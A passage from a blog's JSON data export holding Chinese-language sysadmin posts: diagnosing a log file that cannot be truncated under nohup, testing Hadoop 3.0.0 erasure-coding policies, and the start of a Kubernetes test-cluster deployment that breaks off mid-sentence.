":["system","shell"]},"unlisted":false,"prevItem":{"title":"CentOS7\u7cfb\u7edf\u5b89\u88c5ansible awx\u8bb0\u5f55","permalink":"/notes/blog/2017/12/20/centos7-install-ansible-awx"},"nextItem":{"title":"HADOOP3.0.0\u7ea0\u5220\u7801\u6d4b\u8bd5","permalink":"/notes/blog/2017/08/20/hadoop3-ec-test"}},"content":"> \u9047\u5230\u67d0\u670d\u52a1\u8fdb\u7a0b\u4ea7\u751f\u7684\u65e5\u5fd7\u59cb\u7ec8\u65e0\u6cd5\u5207\u5272\uff0c\u539f\u6765\u539f\u56e0\u5728\u8fd9\u91cc\\n\\n\\n## \u95ee\u9898\u73b0\u8c61\\n\\n\u67d0\u4e1a\u52a1\u673a\u5668\u56e0\u78c1\u76d8\u5bb9\u91cf\u8d85\u8fc7\u9608\u503c\u6536\u5230\u544a\u8b66\uff0c\u5206\u6790\u53d1\u73b0\u662f\u7531\u4e8e\u8be5\u673a\u5668\u4e0a\u67d0\u4e2a\u670d\u52a1\u8fdb\u7a0b\u4ea7\u751f\u7684\u65e5\u5fd7\u6587\u4ef6\u91cf\u592a\u5927\uff0c\u4e14\u65e5\u5fd7\u6587\u4ef6\u672a\u6309\u5468\u671f\u5207\u5272\uff0c\u8fdb\u800c\u5bfc\u81f4\u5386\u53f2\u65e5\u5fd7\u4fe1\u606f\u79ef\u7d2f\u5230\u5355\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u3002\\n\u672a\u907f\u514d\u6545\u969c\u53d1\u751f\u91c7\u53d6\u4e34\u65f6\u63aa\u65bd\u624b\u5de5\u5207\u5272\u8be5\u65e5\u5fd7\u6587\u4ef6\uff0c\u7531\u4e8e\u8be5\u670d\u52a1\u8fdb\u7a0b\u5e76\u672a\u63d0\u4f9b\u5185\u7f6e\u7684\u65e5\u5fd7\u5207\u5272\uff0c\u56e0\u6b64\u624b\u5de5\u6a21\u62df\u7c7b\u4f3clogrotate\u7684```copytruncate```\u6a21\u5f0f\u5bf9\u65e5\u5fd7\u8fdb\u884c\u5207\u5272\u3002\\n\u4f46\u5728\u5c06\u65e5\u5fd7truncate\u4e4b\u540e\uff0c\u5947\u602a\u7684\u4e00\u5e55\u53d1\u751f\u4e86\uff0c\u901a\u8fc7ls\u67e5\u770b\u6587\u4ef6\u5927\u5c0f\u53d1\u73b0\u5e76\u672a\u51cf\u5c11\uff0c\u76f4\u89c9\u5224\u65ad\u8fd9\u53ef\u80fd\u662f\u6587\u4ef6\u53e5\u67c4\u4e00\u76f4\u5904\u4e8e\u6253\u5f00\u72b6\u6001\u4e14\u504f\u79fb\u91cf\u672a\u53d1\u751f\u6539\u53d8\u5bfc\u81f4\u3002\\n\u5728\u8fdb\u4e00\u6b65\u68c0\u67e5\u4e86\u8be5\u8fdb\u7a0b\u7684\u542f\u52a8\u65b9\u5f0f\u4e4b\u540e\uff0c\u53d1\u73b0\u8be5\u8fdb\u7a0b\u901a\u8fc7nohup\u542f\u52a8\uff0c\u5e76\u5c06\u6807\u51c6\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6301\u7eed\u589e\u5927\u7684\u65e5\u5fd7\u6587\u4ef6\u4e2d\u3002\\n\\n## \u6a21\u62df\\n\\n\u6211\u4eec\u901a\u8fc7\u4e0b\u9762\u51e0\u884c\u811a\u672c\u6765\u6a21\u62df\u6b64\u73b0\u8c61\uff1a\\n\\n~~~shell\\n#!/bin/bash\\nwhile true; do\\n    sleep 1\\n    head -5000 /dev/urandom\\ndone\\n~~~\\n\\n\u811a\u672c\u542f\u52a8\u540e\u4f1a\u6709\u4e00\u4e2a\u5e38\u9a7b\u8fdb\u7a0b\u6bcf\u4e2a1\u79d2\u949f\u8f93\u51fa\u4e00\u5806\u5b57\u7b26\u4e32\u4ee5\u6b64\u6765\u6a21\u62df\u65e5\u5fd7\u6587\u4ef6\u589e\u6da8\uff0c\u6211\u4eec\u6309\u7167\u4ee5\u4e0b\u65b9\u5f0f\u542f\u52a8\uff1a\\n\\n~~~shell\\nnohup ./daemon.sh >out.log 2>&1 < /dev/null &\\n~~~\\n\\n\u7b49\u5f85\u4e00\u4f1a\u4e4b\u540e\u6211\u4eec\u89c2\u5bdf\u5230\u65e5\u5fd7\u5df2\u7ecf\u5199\u5165\u4e86\\n\\n~~~\\n[root@localhost t]# ll -h out.log ;du -h out.log \\n-rw-r--r-- 1 root root 64M Oct 19 17:41 out.log\\n64M   out.log\\n~~~\\n\\n\u63a5\u7740\u5c06\u65e5\u5fd7\u6587\u4ef6\u6e05\u7a7a\uff0c\u518d\u89c2\u5bdf\u6587\u4ef6\u5927\u5c0f\u53d8\u5316\\n\\n~~~\\n[root@localhost t]# \\n[root@localhost t]# truncate -s0 out.log              \\n[root@localhost t]# ll -h out.log ;du -h out.log \\n-rw-r--r-- 1 root root 93M Oct 19 17:41 out.log\\n4.0M  out.log\\n~~~\\n\\n\u8fd9\u65f6\u53ef\u4ee5\u770b\u5230\uff0c\u867d\u7136\u6587\u4ef6\u88ab\u6e05\u7a7a\u4e86\uff0c\u4f46\u662fls\u770b\u5230\u7684\u5927\u5c0f\u4f9d\u7136\u6ca1\u6709\u53d1\u751f\u53d8\u5316\uff0c\u4e5f\u5c31\u662f\u8bf4\u6587\u4ef6\u4e2d\u4ea7\u751f\u4e86\u5927\u91cf\u7a7a\u6d1e\u3002\\n\\n\\n## \u89e3\u51b3\u65b9\u6cd5\\n\\n\u5c06nohup\u542f\u52a8\u8fdb\u7a0b\u540e\u7684\u8f93\u51fa\u91cd\u5b9a\u5411 ```>``` \u66ff\u6362\u4e3a ```>>```\uff0c \u5373\u6539\u4e3aappend\u6a21\u5f0f\u6765\u5199\u5165\u65e5\u5fd7\uff0c\u8fd9\u65f6\u518dtruncate\u5c31\u4e0d\u4f1a\u51fa\u73b0\u4e0a\u9762\u7684\u95ee\u9898\u4e86\u3002\\n\\n~~~\\n nohup ./daemon.sh >>out.log 2>&1  </dev/null &\\n \\n \\n[root@localhost t]# ll -h out.log ;du -h out.log \\n-rw-r--r-- 1 root root 48M Oct 19 19:43 out.log\\n64M   out.log\\n[root@localhost t]# ll -h out.log ;du -h out.log \\n-rw-r--r-- 1 root root 77M Oct 19 19:43 out.log\\n128M  out.log\\n[root@localhost t]# truncate -s0 out.log              \\n[root@localhost t]# ll -h out.log ;du -h out.log \\n-rw-r--r-- 1 root root 1.3M Oct 19 19:43 out.log\\n2.0M  out.log\\n~~~\\n\\n\u8fd9\u91cc\u7559\u4e00\u4e2a\u95ee\u9898\uff1a \u4e3a\u4ec0\u4e48\u4f7f\u7528```append```\u6a21\u5f0f\u5c31\u4e0d\u4f1a\u51fa\u73b0\u8fd9\u4e2a\u95ee\u9898\uff1f\\n\\n\u53c2\u8003\u6587\u6863\uff1a\\n\\n[1] https://www.gnu.org/software/bash/manual/bash.html#Redirections\\n\\n[2] https://www.gnu.org/software/coreutils/manual/html_node/nohup-invocation.html"},{"id":"/2017/08/20/hadoop3-ec-test","metadata":{"permalink":"/notes/blog/2017/08/20/hadoop3-ec-test","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2017-08-20-hadoop3-ec-test.md","source":"@site/blog/2017-08-20-hadoop3-ec-test.md","title":"HADOOP3.0.0\u7ea0\u5220\u7801\u6d4b\u8bd5","description":"\u63cf\u8ff0","date":"2017-08-20T00:00:00.000Z","tags":[{"inline":true,"label":"hadoop","permalink":"/notes/blog/tags/hadoop"},{"inline":true,"label":"bigdata","permalink":"/notes/blog/tags/bigdata"}],"readingTime":4.78,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"HADOOP3.0.0\u7ea0\u5220\u7801\u6d4b\u8bd5","description":"\u63cf\u8ff0","categories":["bigdata"],"tags":["hadoop","bigdata"]},"unlisted":false,"prevItem":{"title":"\u5f88\u8be1\u5f02\u7684\u670d\u52a1\u65e5\u5fd7\u65e0\u6cd5\u5207\u5272\u95ee\u9898\u5206\u6790","permalink":"/notes/blog/2017/10/19/bash-nohup-log-truncate"},"nextItem":{"title":"k8s\u6d4b\u8bd5\u73af\u5883\u90e8\u7f72\u8bb0\u5f55","permalink":"/notes/blog/2017/08/18/deploy-k8s-from-local-repo"}},"content":"> \u8bb0\u5f55hadoop3.0.0\u7248\u672c\u6d4b\u8bd5\u5b89\u88c5\u8fc7\u7a0b\uff0c\u5bf9hadoop3.0.0\u4e2d\u7ea0\u5220\u7801\u8fdb\u884c\u4e86\u7b80\u5355\u6d4b\u8bd5\u3002\\n\\n\\n## \u57fa\u7840\u73af\u5883\\n\\nHADOOP3.0.0\u7248\u672c\u4e2d\u589e\u52a0\u4e86\u7ea0\u5220\u7801\u6280\u672f\uff0c\u5728\u63d0\u9ad8\u53ef\u7528\u6027\u7684\u540c\u65f6\u8fd8\u80fd\u51cf\u4f4e\u5b58\u50a8\u6210\u672c\uff0c\u76ee\u524d\u5904\u4e8e\u5b9e\u9a8c\u9636\u6bb5\uff0c\u4ee5\u4e0b\u5c06\u6d4b\u8bd5\u73af\u5883\u4e2d\u7684\u642d\u5efa\u6b65\u9aa4\u53ca\u7b80\u5355\u6d4b\u8bd5\u8fc7\u7a0b\u8fdb\u884c\u8bb0\u5f55\u3002\u672c\u6b21\u4ec5\u5bf9hdfs\u8fdb\u884c\u6d4b\u8bd5\uff0c\u56e0\u6b64\u4e0d\u4f1a\u90e8\u7f72\u5176\u4ed6\u670d\u52a1\u3002\\n\\n\u7cfb\u7edf\u73af\u5883\u5982\u4e0b\uff1a\\n\\nkvm\u865a\u62df\u673a\uff0c1\u4e2anamenode\u8282\u70b9\uff0c6\u4e2adatanode\u8282\u70b9\uff0c4core \uff0c8G mem \uff0c 50G disk\\n\\nhadoop\u7248\u672c\uff1a3.0.0-alpha4\\n\\njava\u7248\u672c\uff1a 1.8.0_144\\n\\n## \u6d4b\u8bd5\u96c6\u7fa4\u5b89\u88c5\\n\\n### \u57fa\u7840\u5305\u5b89\u88c5\\n\\n\u4eceapache\u955c\u50cf\u4e0b\u8f7dhadoop-3.0.0-alpha4\uff0c\u5f53\u524d\u6700\u65b0\u7248\u672c\uff0chadoop home\u76ee\u5f55/opt/hadoop\uff0c\u5728namenode\u8282\u70b9\u5c06\u914d\u7f6e\u7b49\u4fee\u6539\u597d\u4e4b\u540e\u62f7\u8d1d\u5230\u6240\u6709datanode\u8282\u70b9\u3002\\n\\n~~~ bash\\ntar xf hadoop-3.0.0-alpha4.tar.gz\\nmv hadoop-3.0.0-alpha4 /opt/hadoop\\nyum -y install jdk --disablerepo=* --enablerepo=local-custom\\n~~~\\n\\n### \u914d\u7f6e\u6587\u4ef6\u4fee\u6539\\n\\n\u9700\u8981\u4fee\u6539\u7684\u914d\u7f6e\u6587\u4ef6\u6709hadoop-env.sh \u3001core-site.xml\u3001hdfs-site.xml\\n\\n\\n\u4fee\u6539`/opt/hadoop/etc/hadoop/hadoop-env.sh`\u4e2d\u4ee5\u4e0b\u53c2\u6570\uff1a\\n\\n~~~ bash\\nexport JAVA_HOME=/usr/java/jdk1.8.0_144\\nexport HADOOP_HOME=/opt/hadoop\\n# \u6ce8\u610f\u8fd9\u91cc\u914d\u7f6eheapsize\u548c2.7\u7248\u672c\u7684\u5dee\u522b\uff0c2.7\u4e3aHADOOP_HEAPSIZE\\nexport HADOOP_HEAPSIZE_MAX=1024\\nexport HADOOP_OPTS=\\"$HADOOP_OPTS -Djava.net.preferIPv4Stack=true\u201d\\nexport HADOOP_CLIENT_OPTS=\\"-Xmx512m $HADOOP_CLIENT_OPTS\u201d\\nexport HADOOP_LOG_DIR=${HADOOP_HOME}/logs\\nexport HADOOP_PID_DIR=/tmp\\n~~~\\n\\n\u4fee\u6539`/opt/hadoop/etc/hadoop/hdfs-site.xml`\u5185\u5bb9\u5982\u4e0b\uff1a\\n\\n~~~ xml\\n<configuration>\\n   <property>\\n      <name>dfs.blocksize</name>\\n      <value>134217728</value>\\n    </property>\\n   <property>\\n      <name>dfs.datanode.data.dir</name>\\n      <value>/data/hdfs/data</value>\\n      <final>true</final>\\n    </property>\\n    <property>\\n      <name>dfs.namenode.name.dir</name>\\n      <value>/data/hdfs/namenode</value>\\n      <final>true</final>\\n    </property>\\n   <property>\\n      <name>dfs.namenode.rpc-address</name>\\n      <value>192.168.199.26:8020</value>\\n    </property>\\n</configuration>\\n~~~\\n\\n\u5c06\u73af\u5883\u53d8\u91cf\u589e\u52a0\u5230\u5f53\u524d\u7528\u6237bashrc\uff1a\\n\\n~~~ bash\\n# ~/.bashrc\\nexport HADOOP_HOME=/opt/hadoop\\nexport PATH=$PATH:/opt/hadoop/bin\\n~~~\\n\\n\u914d\u7f6e\u4fee\u6539\u5b8c\u6210\u540e\u5c06/opt/hadoop\u6574\u4e2a\u76ee\u5f55\u540c\u6b65\u5230\u6240\u6709datanode\u8282\u70b9\u3002\\n\\n## \u542f\u52a8HDFS\\n\\n### \u683c\u5f0f\u5316namenode\\n\\n~~~ bash\\nhdfs namenode -format ns1\\n~~~\\n\\n### \u542f\u52a8namenode\u548cdatanode\\n\\n~~~ bash\\n# \u6ce8\u610f3.0.0\u7248\u672c\u7684\u5dee\u522b\uff0c\u57282.7\u4e2d\u542f\u52a8\u811a\u672c\u5982\u4e0b\\nhadoop-daemon.sh --config $HADOOP_HOME/etc/hadoop --script hdfs start namenode\\nhadoop-daemon.sh --config $HADOOP_HOME/etc/hadoop --script hdfs start datanode\\n# \u65b0\u7248\u672c\u4e2d\u5df2\u7ecf\u91cd\u5199\u4e86\u7ba1\u7406\u811a\u672c\uff0c\u7edf\u4e00\u5230hdfs\u547d\u4ee4\u4e2d\uff0c\u542f\u52a8\u65b9\u5f0f\u5982\u4e0b\uff1a\\nhdfs --daemon start namenode\\nhdfs --daemon start datanode\\n~~~\\n\\n\u542f\u52a8\u6210\u529f\u4e4b\u540e\u5373\u53ef\u901a\u8fc7[namenode web ui](http://192.168.199.26:9870/dfshealth.html#tab-datanode)\u89c2\u5bdf\u5230\u96c6\u7fa4\u57fa\u672c\u60c5\u51b5\uff0c2.7\u4e2d\u9ed8\u8ba4web ui\u7aef\u53e3\u4e3a50070\uff0c\u800c3.0.0\u4e2d\u4fee\u6539\u4e3a9870\uff0c\\n\\n## \u6d4b\u8bd5hdfs\\n\u542f\u52a8\u5b8c\u6210\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7hdfs\u547d\u4ee4\u6d4b\u8bd5\u670d\u52a1\u662f\u5426\u53ef\u7528\uff1a\\n\\n~~~ bash\\nhdfs dfs -mkdir hdfs://192.168.199.26:8020/t1/\\ndd if=/dev/urandom of=f1 bs=1M count=5000\\nhdfs dfs -put f1 hdfs://192.168.199.26:8020/t1/\\nhdfs dfs -rm -skipTrash hdfs://192.168.199.26:8020/t1/f1\\n~~~\\n\\n\u8fd9\u91cc\u4f7f\u7528\u7684\u65f6\u5019\u9700\u8981\u5199\u5b8c\u6574\u7684hdfs\u534f\u8bae\u548cnamenode:port\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u4e00\u4e0b\u914d\u7f6e\u6587\u4ef6\uff0c\u5c06defaultfs\u4fee\u6539\u4e3ahdfs\u534f\u8bae\uff0c\u65b9\u4fbf\u6d4b\u8bd5\u3002\u540c\u65f6\u6b64\u7248\u672c\u4e2d\u9ed8\u8ba4\u5e76\u672a\u542f\u7528\u7ea0\u5220\u7801\uff0c\u9700\u8981\u624b\u5de5\u914d\u7f6e\u3002\\n\u9ed8\u8ba4\u5185\u7f6e\u652f\u6301\u7684policy\u6709 RS-3-2-64k, RS-6-3-64k, RS-10-4-64k, RS-LEGACY-6-3-64k, XOR-2-1-64k\uff0c\u6211\u8fd9\u91cc\u53ea\u51c6\u5907\u4e86\u5c11\u91cf\u8282\u70b9\uff0c\u56e0\u6b64\u53ea\u5bf9\u5176\u4e2d\u4e24\u79cd\u8fdb\u884c\u7b80\u5355\u6d4b\u8bd5\u3002\\n\\n\u4fee\u6539`hdfs-site.xml` \u589e\u52a0\u4ee5\u4e0b\u914d\u7f6e\uff1a\\n\\n~~~ xml\\n    <property>\\n      <name>dfs.namenode.ec.policies.enabled</name>\\n      <value>XOR-2-1-64k,RS-3-2-64k</value>\\n    </property>\\n    <property>\\n      <name>dfs.nameservices</name>\\n      <value>ns1</value>\\n    </property>\\n    <property>\\n        <name>dfs.ha.namenodes.ns1</name>\\n        <value>nn1</value>\\n    </property>\\n    <property>\\n      <name>dfs.namenode.rpc-address.ns1.nn1</name>\\n      <value>192.168.199.26:8020</value>\\n    </property>\\n    <property>\\n        <name>dfs.client.failover.proxy.provider.ns1</name>\\n        <value>org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider</value>\\n    </property>\\n~~~\\n\\n\u4fee\u6539`core-site.xml`\u589e\u52a0\u4ee5\u4e0b\u914d\u7f6e\uff1a\\n\\n~~~ xml\\n<configuration>\\n    <property>\\n      <name>fs.defaultFS</name>\\n      <value>hdfs://ns1</value>\\n      <final>true</final>\\n    </property>\\n</configuration>\\n~~~\\n\\n\u91cd\u542fnamenode\u8282\u70b9\u540e\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u7ea0\u5220\u7801\u4e86\uff0c\u7ea0\u5220\u7801\u53ef\u4ee5\u9488\u5bf9\u76ee\u5f55\u8fdb\u884c\u8bbe\u7f6e\uff0c\u4e0d\u540c\u7684\u76ee\u5f55\u8bbe\u7f6e\u4e0d\u540c\u7684\u7b56\u7565\u3002\\n\\n~~~ bash\\nhdfs ec -setPolicy -policy XOR-2-1-64k -path /t1\\nhdfs ec -setPolicy -policy RS-3-2-64k -path /t2\\n~~~\\n\\n\u6211\u4eec\u51c6\u5907\u4e863\u4e2a\u76ee\u5f55\uff0ct1\u548ct2\u5206\u522b\u8bbe\u7f6e\u4e86\u4e0d\u540c\u7684policy\uff0ct3\u4e0d\u8bbe\u7f6e\uff0c\u5f803\u4e2a\u76ee\u5f55\u4e0a\u4f20\u76f8\u540c\u76845G\u5927\u5c0f\u7684\u6587\u4ef6\uff0c\u6bcf\u6b21\u4e0a\u4f20\u524d\u5747\u6e05\u7a7ahdfs\u4e2d\u6570\u636e\uff0c\u5e76\u6e05\u7a7a\u865a\u62df\u673a\u548c\u7269\u7406\u673a\u7f13\u5b58\uff0c\u7edf\u8ba1\u7684\u8017\u65f6\u548c\u7a7a\u95f4\u5360\u7528\u60c5\u51b5\u5927\u81f4\u5982\u4e0b\uff1a\\n\\n\\n| HDFS\u76ee\u5f55        | \u7ea0\u5220\u7801\u7b56\u7565 |     put\u8017\u65f6     | \u78c1\u76d8\u5360\u7528kb     |\\n|-----------------|-----------|---------------|---------------|\\n| t1              |XOR-2-1-64k | 1m15.559s       | 7740364        |\\n| t2              |RS-3-2-64k  | 1m13.920s       | 8600436        |\\n| t3              |\u65e0(\u4e09\u526f\u672c)  | 2m7.705s        | 15480600       |\\n\\n\\n\u901a\u8fc7\u7b80\u5355\u7684\u6d4b\u8bd5\u5bf9\u6bd4\uff0c\u6211\u4eec\u53ef\u4ee5\u5927\u81f4\u4e86\u89e3\u5230\u5728\u7406\u60f3\u72b6\u6001\u4e0b\u7ea0\u5220\u7801\u6280\u672f\u6bd4\u4f20\u7edf\u7684\u4e09\u526f\u672c\u5728\u5199\u5165\u901f\u5ea6\u4e0a\u6709\u63d0\u5347\uff0c\u56e0\u5176\u964d\u4f4e\u4e86\u5bf9\u78c1\u76d8IO\u548c\u5e26\u5bbd\u7684\u6d88\u8017\uff0c\u540c\u65f6\u5360\u7528\u7684\u78c1\u76d8\u7a7a\u95f4\u5c0f\u4e8e\u4e09\u526f\u672c\u65b9\u5f0f\u3002\u5176\u4e2d\u78c1\u76d8\u5360\u7528\u548c\u4e0d\u540c\u7684\u7ea0\u5220\u7801\u7b56\u7565\u7406\u8bba\u503c\u57fa\u672c\u543b\u5408\uff0c \u78c1\u76d8\u7a7a\u95f4\u6d88\u8017\u500d\u6570\u4e3a `(\u6821\u9a8c\u5757+\u6570\u636e\u5757)/\u6570\u636e\u5757`\u3002\\n\\n\u6ce8\u610f\u8fd9\u91cc\u7684\u6d4b\u8bd5\u4ec5\u9650\u4e8e\u5bf9HADOOP3.0.0\u4e2d\u7ea0\u5220\u7801\u6709\u4e00\u4e2a\u611f\u6027\u8ba4\u8bc6\uff0c\u6d4b\u8bd5\u65b9\u6cd5\u6709\u5f88\u591a\u4e0d\u4e25\u8c28\u7684\u5730\u65b9\uff0c\u6bd4\u5982put\u6570\u636e\u7684\u8017\u65f6\u5e76\u672a\u8003\u8651\u5404\u79cd\u73af\u5883\u56e0\u7d20\uff0c\u4ec5\u4ec5\u662f\u5728\u4e00\u4e2a\u76f8\u5bf9\u7406\u60f3\u7684\u73af\u5883\u4e0b\u8fdb\u884c\u7b80\u5355\u6d4b\u8bd5\u3002\u5b9e\u9645\u751f\u4ea7\u73af\u5883\u4e2d\u60c5\u51b5\u975e\u5e38\u590d\u6742\uff0c\u9700\u8981\u6743\u8861CPU\u5e26\u5bbd\u78c1\u76d8\uff0c\u751a\u81f3\u673a\u67b6\u4f9b\u7535\u7b49\u5404\u65b9\u9762\u56e0\u7d20\uff0c\u5982\u679c\u9700\u8981\u83b7\u5f97\u4e00\u4efd\u53ef\u9760\u7684\u6027\u80fd\u5bf9\u6bd4\u6570\u636e\u5219\u5fc5\u987b\u4fdd\u969c\u7a33\u5b9a\u8fd0\u884c\u8db3\u591f\u957f\u7684\u65f6\u95f4\uff0c\u901a\u8fc7\u957f\u671f\u89c2\u5bdf\u624d\u80fd\u5f97\u51fa\u5bf9\u751f\u4ea7\u6709\u5b9e\u9645\u6307\u5bfc\u610f\u4e49\u7684\u4fe1\u606f\u3002\\n\\n\\n\u53c2\u8003\u6587\u6863\uff1a\\n\\n[1] http://hadoop.apache.org/docs/r3.0.0-alpha4/hadoop-project-dist/hadoop-common/ClusterSetup.html\\n\\n[2] http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/HDFSErasureCoding.html"},{"id":"/2017/08/18/deploy-k8s-from-local-repo","metadata":{"permalink":"/notes/blog/2017/08/18/deploy-k8s-from-local-repo","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2017-08-18-deploy-k8s-from-local-repo.md","source":"@site/blog/2017-08-18-deploy-k8s-from-local-repo.md","title":"k8s\u6d4b\u8bd5\u73af\u5883\u90e8\u7f72\u8bb0\u5f55","description":"\u8bb0\u5f55k8s\u5728\u672c\u5730\u6d4b\u8bd5\u73af\u5883\u7684\u90e8\u7f72\u8fc7\u7a0b","date":"2017-08-18T00:00:00.000Z","tags":[{"inline":true,"label":"k8s","permalink":"/notes/blog/tags/k-8-s"},{"inline":true,"label":"kubernetes","permalink":"/notes/blog/tags/kubernetes"}],"readingTime":3.71,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"k8s\u6d4b\u8bd5\u73af\u5883\u90e8\u7f72\u8bb0\u5f55","description":"\u8bb0\u5f55k8s\u5728\u672c\u5730\u6d4b\u8bd5\u73af\u5883\u7684\u90e8\u7f72\u8fc7\u7a0b","categories":["system"],"tags":["k8s","kubernetes"]},"unlisted":false,"prevItem":{"title":"HADOOP3.0.0\u7ea0\u5220\u7801\u6d4b\u8bd5","permalink":"/notes/blog/2017/08/20/hadoop3-ec-test"},"nextItem":{"title":"nftables\uff1anft man\u6587\u6863\u9605\u8bfb\u7b14\u8bb0","permalink":"/notes/blog/2017/06/13/nftables-man-page"}},"content":"> \u672c\u6587\u8bb0\u5f55\u4e86\u5728\u672c\u5730\u90e8\u7f72k8s\u6d4b\u8bd5\u73af\u5883\u7684\u8fc7\u7a0b\uff0c\u90e8\u7f72\u811a\u672c\u53c2\u8003github\u4e0a\u5176\u4ed6\u540c\u5b66\u5206\u4eab\u7684\u811a\u672c\uff0c\u5728\u5176\u57fa\u7840\u4e0a\u505a\u4e86\u4e9b\u5c0f\u6539\u52a8\u3002\\n\\n\\n\\n## k8s \u4e2d\u7684\u8282\u70b9\u7c7b\u578b\\n\\nmaster \u8d1f\u8d23\u7ba1\u7406\u5176\u4ed6\u8282\u70b9\u7684\u8c03\u5ea6\u4e2d\u5fc3\uff0cmaster\u53ef\u4ee5\u6709\u5907\u673areplica\u505a\u5197\u4f59\\n\\nminion \u7531master\u7ba1\u7406\uff0c\u8fd0\u884c\u5bb9\u5668\u670d\u52a1\uff0c1\u4e2a\u96c6\u7fa4\u4e2d\u6709N\u4e2aminion\u8282\u70b9\\n\\n## \u90e8\u7f72\u524d\u51c6\u5907\\n\\n\u90e8\u7f72\u6b64\u6d4b\u8bd5\u73af\u5883\u53c2\u8003\u4e86github\u4e0a\u5176\u4ed6\u540c\u5b66\u7684\u5206\u4eab\uff0c\u6211fork\u7684repo\u5730\u5740\uff1ahttps://github.com/5xops/k8s-deploy\\n\\n\u9996\u5148\u6309\u7167github repo\u4e2d\u7684readme\u90e8\u5206\u5c06k8s rpm\u5305\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u4ee5\u51c6\u5907\u79bb\u7ebf\u90e8\u7f72\u3002\u5176\u6b21\u6211\u5728\u672c\u5730\u6d4b\u8bd5\u73af\u5883\u51c6\u5907\u4e866\u4ee5\u4e0a\u7684\u865a\u62df\u673a\u8282\u70b9\uff0c\u5176\u4e2d3\u4e2a\u8282\u70b9\u7528\u4e8e\u90e8\u7f72etcd\u96c6\u7fa4\uff0c2\u4e2a\u8282\u70b9\u7528\u4e8e\u90e8\u7f72k8s master\uff0c\u5176\u4f59\u8282\u70b9\u7528\u4e8e\u90e8\u7f72k8s minion\u3002\\n\u6240\u6709\u865a\u62df\u673a\u5747\u8fd0\u884c\u5728\u4e00\u53f0\u7269\u7406\u670d\u52a1\u5668\u4e0a\uff0c\u7ba1\u7406\u865a\u62df\u673a\u7528\u4e86\u8fd9\u4e2a\u811a\u672c\uff08https://github.com/itxx00/vmm\uff09\u3002\\n\\n\u9996\u5148\u521b\u5efa\u597d\u9700\u8981\u4f7f\u7528\u5230\u7684\u865a\u62df\u673a\u8282\u70b9\uff1a\\n```\\nvmm create etcd1\\nvmm create etcd2\\nvmm create etcd3\\nvmm create kubem1\\nvmm create kubem2\\nvmm create node1\\nvmm create node2\\n```\\n\\n\u56e0\u90e8\u7f72k8s\u96c6\u7fa4\u65f6\u8981\u6c42\u6240\u6709\u8282\u70b9\u90fd\u914d\u7f6e\u597d\u4e3b\u673a\u540d\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u521b\u5efa\u51fa\u6765\u7684\u865a\u62df\u673a\u6ca1\u6709\u4fee\u6539hostname\uff0c\u9700\u8981\u4f7f\u7528\u53e6\u5916\u4e00\u4e2a\u811a\u672c\u6765\u914d\u7f6ehostname\u5e76\u914d\u7f6e\u597d/etc/hosts\uff0c\u9996\u5148\u51c6\u5907\u597d\u521d\u59cb\u5316\u6267\u884c\u7684\u811a\u672c\uff1a\\n```\\n#!/bin/bash\\n# content of ~/.vmm/init.sh\\ncd /tmp\\nhostnm=$(cat hostname)\\n[[ -n $hostnm ]] || {\\n    echo \\"err\\"\\n    exit 1\\n}\\necho $hostnm >/etc/hostname\\nhostname $hostnm\\ncat /tmp/hosts.tmp >/etc/hosts\\n\\n```\\n\\n\u63a5\u7740\u6267\u884c\u521d\u59cb\u5316\u64cd\u4f5c\uff1a\\n```\\nvminit etcd1\\nvminit etcd2\\nvminit etcd3\\nvminit kubem1\\nvminit kubem2\\nvminit node1\\nvminit node2\\n```\\n\u6bcf\u4e2a\u8282\u70b9\u7684hostname\u5c06\u88ab\u8bbe\u7f6e\u6210\u865a\u62df\u673a\u7684\u540d\u5b57\uff0c\u540c\u65f6vminit\u811a\u672c\u4f1a\u628a\u672c\u5730\u7684ssh\u516c\u94a5\u548c\u79c1\u94a5\u90fd\u62f7\u8d1d\u5230\u865a\u62df\u673a\u8282\u70b9\uff0c\u8fd9\u6837\u521d\u59cb\u5316\u4e4b\u540e\u7684\u8282\u70b9\u53ef\u4ee5\u901a\u8fc7\u76f8\u540c\u7684\u5bc6\u94a5\u4e92\u76f8\u514d\u5bc6\u767b\u5f55\uff0c\u6ce8\u610f\u8fd9\u6837\u7684\u64cd\u4f5c\u4ec5\u9002\u7528\u4e8e\u5feb\u901f\u642d\u5efa\u6d4b\u8bd5\u73af\u5883\uff0c\u751f\u4ea7\u73af\u5883\u5343\u4e07\u4e0d\u8981\u8fd9\u4e48\u5904\u7406\u3002\u6253\u901a\u514d\u5bc6ssh\u662f\u56e0\u4e3a\u540e\u9762\u90e8\u7f72k8s\u65f6\u4f1a\u7528\u5230\u3002\\n\\n## \u642d\u5efaetcd\u96c6\u7fa4\\n\\n\u5728\u90e8\u7f72k8s\u96c6\u7fa4\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5148\u90e8\u7f72\u4e00\u4e2a\u72ec\u7acb\u7684etcd\u96c6\u7fa4\uff0ck8s\u4f1a\u7528\u5230\u8fd9\u4e2a\u96c6\u7fa4\u3002\u8fd9\u91cc\u6211\u91c7\u7528ansible playbook\u6765\u90e8\u7f72\uff0cplaybook\u5df2\u7ecf\u5206\u4eab\u5230github\u4e0a\u9762\uff0c\uff08https://github.com/itxx00/ansible-etcd\uff09\uff0c\u6309\u7167repo\u4e2d\u7684readme\u6765\u51c6\u5907\u597d\u96c6\u7fa4\u3002\\n\\n## \u51c6\u5907\u955c\u50cf\u4ed3\u5e93\\n\\n\u5c06\u4e0b\u8f7d\u4e0b\u6765\u7684k8s 